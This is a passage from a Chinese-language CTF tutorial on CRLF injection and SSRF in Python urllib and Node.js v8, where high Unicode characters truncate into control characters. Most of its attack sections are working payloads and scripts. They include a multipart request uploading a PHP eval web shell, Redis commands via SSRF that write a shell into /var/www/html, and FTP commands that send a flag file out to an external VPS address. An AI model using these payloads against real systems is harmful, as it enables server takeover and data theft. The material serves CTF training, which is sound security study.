Host: 127.0.0.1
Content-Length: 435
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
Connection: close

------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php eval($_POST[whoami]);?>
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryjDb9HMGTixAA7Am6--

GET / HTTP/1.1
test:'''.replace("\n","\\r\\n")

print(payload)

# 输出: HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="uploaded"; filename="shell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php eval($_POST[whoami]);?>\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:
```

然后构造请求：

```python
#!python
#!/usr/bin/env python3
import urllib
import urllib.request
import urllib.error

# url = "http://47.101.57.72:4000
url = 'http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="uploaded"; filename="shell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php eval($_POST[whoami]);?>\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:'
# ?a=1 后面的那个HTTP/1.1是为了闭合正常的HTTP状态行
try:
    info = urllib.request.urlopen(url).info()
    print(info)

except urllib.error.URLError as e:
    print(e)
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200209-19544165-2e99-4c3e-b3dd-e6171848937d.png#averageHue=%230c2335&id=cJLxS&originHeight=901&originWidth=1532&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## NodeJS 中的 CRLF Injection

Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的

### HTTP 请求路径中的 Unicode 字符损坏

虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 \u0130 就会被截断为 \u30：

### Unicode 字符损坏造成的 HTTP 拆分攻击

由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：

```python
> var http = require("http");
> http.get('http://47.101.57.72:4000/\r\n/WHOAMI').output
[ 'GET /%0D%0A/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200300-d4fb7874-f7f7-4100-91f2-f05ca21cd6c5.png#averageHue=%230c2436&id=IaVSz&originHeight=211&originWidth=838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：

```python
> 'http://47.101.57.72:4000/\u{010D}\u{010A}/WHOAMI'
http://47.101.57.72:4000/čĊ/WHOAMI
```

当 Node.js v8 或更低版本对此URL发出 GET 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：

```bash
> http.get('http://47.101.57.72:4000/\u010D\u010A/WHOAMI').output
[ 'GET /čĊ/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
```

但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：

```bash
> Buffer.from('http://47.101.57.72:4000/\u{010D}\u{010A}/WHOAMI', 'latin1').toString()
'http://47.101.57.72:4000/\r\n/WHOAMI'
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200403-6d8e0c3f-88be-4e78-ad66-0325ba44b5f6.png#averageHue=%230c2436&id=XLrXf&originHeight=236&originWidth=844&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。

不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：

| 字符 | 可由以下Unicode编码构造出 | Unicode编码对应的字符 | Unicode编码对应的字符对应的URL编码 |
| --- | --- | --- | --- |
| 回车符 \\r | \\u010d | č | %C4%8D |
| 换行符 \\n | \\u010a | Ċ | %C4%8A |
| 空格 | \\u0120 | Ġ | %C4%A0 |
| 反斜杠 \\ | \\u0122 | Ģ | %C4%A2 |
| 单引号 ‘ | \\u0127 | ħ | %C4%A7 |
| 反引号 ` | \\u0160 | Š | %C5%A0 |
| 叹号 ! | \\u0121 | ġ | %C4%A1 |


这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：

### 注入恶意首部字段

由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行：

```bash
> http.get('http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami').output
[ 'GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200524-a317e30b-b3f0-417a-b8cc-5e33c452e9d3.png#id=VAzOk&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 HTTP/1.1 ，但我们根据该原理依然可以将其闭合：

```bash
> http.get('http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:').output
[ 'GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200637-1ebac317-9c9f-4221-982d-7575ae3567f7.png#id=hwQ21&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这样，我们便可以构造 “任意” 的HTTP请求了。

### 注入完整HTTP请求

首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。

假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：

```bash
POST /upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 437
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
Connection: close

------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php eval($_POST["whoami"]);?>
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryjDb9HMGTixAA7Am6--
```

为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：

```bash
payload = ''' HTTP/1.1

POST /upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 437
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
Connection: close

------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php eval($_POST["whoami"]);?>
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryjDb9HMGTixAA7Am6--

GET / HTTP/1.1
test:'''.replace("\n","\r\n")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)
print(payload)

# 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ
```

构造请求：

```bash
> http.get('http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ')
```

### CRLF+SSRF 攻击redis

```bash
import urllib.parse

payload = ''' HTTP/1.1

flushall
config set dir /var/www/html/
config set dbfilename shell.php
set x '<?php eval($_POST[whoami]);?>'
save
test: '''
payload = urllib.parse.quote(payload).replace("%0A", "%0D%0A")
payload = "?url=http://127.0.0.1:6379/" + payload
print(payload)

# 输出: ?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0A%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20
```

自己 VPS 上测试一下：

```bash
?url=http://47.101.57.72:6379/%20HTTP/1.1%0D%0A%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200713-b1b4e9a1-47bc-4818-81ac-7a1460bf9258.png#id=cg48b&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，成功发送出了 Redis 命令。下面开始正式攻击：

```
/?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20
```

### CRLF+SSRF 攻击FTP

这里我们只演示通过匿名登录 FTP 服务器并获取 files 目录里的 flag 文件的过程，需要执行的 FTP 命令如下：

```python
USER anonymous
PASS 
CWD files
TYPE I
PORT 47,101,57,72,0,2000
RETR flag
```

整个攻击过程是攻击者先连接到 FTP 服务器的 21 号端口进行传输控制，通过USER命令和PASS命令进行匿名登录后，先使用 CWD 命令进入 files 目录，然后使用 TYPE 命令指定传输模式为 Ascii ，接着使用 PORT 命令切换 FTP 传输方式为主动传输。FTP 服务器在收到 PORT 命令后，通过自己的 20 端口连接至客户端用 PORT 命令指定的 VPS 端口（2000）发送数据。最后向 FTP 服务器发送 RETR 命令将 flag 文件内容发送到 PORT 命令指定的 VPS 端口上。

然后要做的就是使用 HTTP 协议配合 CRLF 将这些 FTP 命令构造成 TCP Stream 并通过 SSRF 发送给目标服务器。

编写脚本构造 payload：

```python
import urllib.parse

payload = ''' HTTP/1.1

USER anonymous
PASS 
CWD files
TYPE I
PORT 47,101,57,72,0,2000
RETR flag
test: '''
payload = urllib.parse.quote(payload).replace("%0A", "%0D%0A")
payload = "?url=http://127.0.0.1:21/" + payload
print(payload)

# 输出: ?url=http://127.0.0.1:21/%20HTTP/1.1%0D%0A%0D%0AUSER%20anonymous%0D%0APASS%20%0D%0ACWD%20files%0D%0ATYPE%20I%0D%0APORT%2047%2C101%2C57%2C72%2C0%2C2000%0D%0ARETR%20flag%0D%0Atest%3A%20
```

我们现在自己 VPS 上测试一下：

```python
?url=http://47.101.57.72:4000/%20HTTP/1.1%0D%0A%0D%0AUSER%20anonymous%0D%0APASS%20%0D%0ACWD%20files%0D%0ATYPE%20I%0D%0APORT%2047%2C101%2C57%2C72%2C0%2C2000%0D%0ARETR%20flag%0D%0Atest%3A%20
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200808-36a0ee73-9a46-4c1e-814e-ec8546422d2a.png#id=GSKzf&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 例题

参考例题篇

[2021 MRCTF]Half-Nosqli

[GYCTF2020]Node Game

[2020 祥云杯]doyouknowssrf

[https://www.anquanke.com/post/id/240014#h3-19](https://www.anquanke.com/post/id/240014#h3-19)

[https://www.anquanke.com/post/id/241429](https://www.anquanke.com/post/id/241429)

# TLS-Poison攻击

来源于ACTF ToLeSion

[https://github.com/l3s10n/My-CTF-Challenges-In-ACTF2022/blob/main/writeup/ToLeSion_zh.md](https:_github.com_l3s10n_my-ctf-challenges-in-actf2022_blob_main_writeup_tolesion_zh)

[https://blog.zeddyu.info/2021/05/19/tls-ctf/](https://blog.zeddyu.info/2021/05/19/tls-ctf/)

# Zimbra SSRF+Memcached

[https://blog.csdn.net/fnmsd/article/details/89235589](https://blog.csdn.net/fnmsd/article/details/89235589)
